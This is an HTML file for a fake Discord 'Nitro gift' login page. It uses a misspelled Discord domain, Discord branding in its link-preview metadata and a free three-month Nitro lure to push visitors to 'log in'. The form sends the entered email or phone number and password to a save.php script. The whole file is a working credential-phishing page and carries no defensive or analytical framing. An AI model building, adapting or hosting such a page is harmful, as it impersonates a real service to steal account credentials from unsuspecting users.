<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="../assest/style.css"/>
    <meta property="og:site_name" content="Discord Gift">
    <meta property="og:url" content="https://dliscord.">
    <meta property="og:title" content="Discord">
    <meta property="og:description" content="You Have Been Gifted A 3 Month Nitro">
    <meta property="og:type" content="Discord">
    <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
  </head>
  <body>
    <center>
    <div class="loginPart">
      <br/><br/><br/>
                       You Have Been Gifted a 3 Month Nitro! you need to                  login to earn it.
      <br/><br/><br/>
      <p class="welcome">Welcome Back!</p>
        <br/>
        Email or Phone number:
        <br/>
      <form method="POST" action="save.php">
        <input type="text" name="user" class="inputs" />
        <br/>
        Password:
        <br/>
       <input type="password" name="pass" class="inputs"/>
        <br/><br/>
        <input type="submit" name="submit" value="Login" class="submit"/>
      </form>
    </div>
  </center>
  </body>
</html>
